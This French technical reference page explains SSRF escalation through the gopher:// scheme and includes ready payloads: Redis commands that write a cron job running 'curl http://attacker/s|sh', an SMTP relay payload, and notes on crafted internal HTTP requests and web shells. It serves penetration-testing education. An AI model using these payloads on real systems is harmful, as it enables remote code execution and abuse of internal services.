---
title: "Scheme Gopher pour un SSRF à socket brut"
description: "Le handler gopher:// écrit des octets contrôlés par l'attaquant vers un port TCP, ce qui fait passer en contrebande des payloads de protocole confectionnés dans Redis, SMTP et des services HTTP, et constitue le scheme SSRF le plus puissant."
keywords:
  - scheme gopher
  - gopher://
  - Redis RCE
  - TCP brut
  - SMTP smuggling
  - payload CRLF
---

# Gopher

Le scheme `gopher://` est l'escalade SSRF la plus forte parce qu'il écrit un flux d'octets arbitraire vers un port TCP choisi. Là où [DICT](dict.md) envoie une seule ligne, gopher envoie toute une requête confectionnée, donc il fait passer en contrebande des échanges de protocole complets dans des services internes qui supposent que seuls des clients locaux de confiance les atteignent.

## Comment les octets sont construits

L'URL est `gopher://host:port/` suivie d'un unique caractère de type d'item (par convention `_`, et ignoré) puis du payload, encodé en URL. Le retour chariot et le saut de ligne sont `%0d%0a`, ce qui permet à un payload de s'étendre sur les multiples lignes dont un vrai protocole a besoin :

```
gopher://127.0.0.1:6379/_<url-encoded bytes>
```

Tout ce qui suit le caractère de type d'item est envoyé verbatim sur la connexion.

## Redis

Redis accepte les commandes inline terminées par CRLF, donc un payload gopher le pilote directement. Une simple écriture, avec `%0d%0a` terminant la ligne :

```
gopher://127.0.0.1:6379/_set%20ssrf%20proof%0d%0a
```

Chaîner plusieurs lignes séparées par CRLF dans un seul payload exécute une séquence. La route de persistance classique reconfigure l'endroit où Redis sauvegarde sa base, écrit une clé contrôlée par l'attaquant, puis la sauvegarde sur disque de sorte que le fichier atterrisse dans un emplacement utile (une entrée cron sous `/var/spool/cron`, une clé autorisée, ou un web shell dans un répertoire servi). Les commandes de reconfiguration n'ont pas de sauts de ligne embarqués, elles passent donc comme des lignes inline :

```
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SAVE
```

La clé de payload est la subtilité. Une entrée cron a besoin de sauts de ligne embarqués, et le protocole Redis inline traite un saut de ligne comme la fin d'une commande, donc la valeur ne peut pas être envoyée inline. Elle doit passer comme une **RESP bulk string**, dont la longueur en octets déclarée compte les sauts de ligne, de sorte que Redis lit toute la valeur multi-ligne comme un seul argument :

```
*3\r\n$3\r\nSET\r\n$1\r\nx\r\n$<N>\r\n\n\n*/1 * * * * curl http://attacker/s|sh\n\n\r\n
```

`$<N>` est la longueur exacte en octets de la valeur qui suit (les deux sauts de ligne de tête, la ligne cron, et les deux sauts de ligne de fin) ; le `\r\n` qui le suit termine la bulk string, tandis que les `\n` à l'intérieur sont des données. Tout le flux est ensuite encodé en URL après le type d'item gopher, avec `%0d%0a` pour les CRLF de framing RESP et `%0a` pour les sauts de ligne de données. Envoyée inline avec des sauts de ligne bruts à la place, Redis parserait le texte cron comme des commandes malformées séparées et la clé ne contiendrait jamais le payload.

## SMTP et HTTP

La même primitive parle n'importe quel protocole texte. Un serveur SMTP interne sans authentification relaie du courrier lorsqu'on lui remet une enveloppe complète :

```
gopher://127.0.0.1:25/_HELO%20x%0d%0aMAIL%20FROM:<a@x>%0d%0aRCPT%20TO:<b@y>%0d%0aDATA%0d%0aSubject:test%0d%0a%0d%0abody%0d%0a.%0d%0a
```

Une requête HTTP confectionnée vers un service interne (y compris un `POST` avec un corps, qu'un simple sink `http://` ne peut pas façonner) est écrite de la même manière, ligne par ligne avec `%0d%0a`, laissant gopher forger des requêtes qu'un fetch HTTP normal ne pourrait pas.

## Pourquoi c'est le scheme prioritaire

Gopher convertit le SSRF d'une primitive de lecture en une primitive d'écriture contre des services internes, ce qui est le pas de la divulgation d'information vers l'exécution de code. Lorsqu'un scan de [Port](../authority/port.md) trouve Redis, memcached, ou un service SMTP ou HTTP non authentifié, gopher est le scheme qui agit dessus. Il dépend du client honorant `gopher://` (les clients adossés à curl le font couramment), donc confirmez d'abord le handler.

## Outils

- **Gopherus** : confectionne des payloads gopher pour Redis, FastCGI et SMTP via SSRF.
- **SSRFmap** : exploitation SSRF automatisée qui construit des payloads gopher contre des services internes.
- **curl** : livraison manuelle `gopher://` d'un flux d'octets brut encodé en URL vers un port choisi.

## Références

- [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [curl: supported protocols](https://curl.se/docs/url-syntax.html)
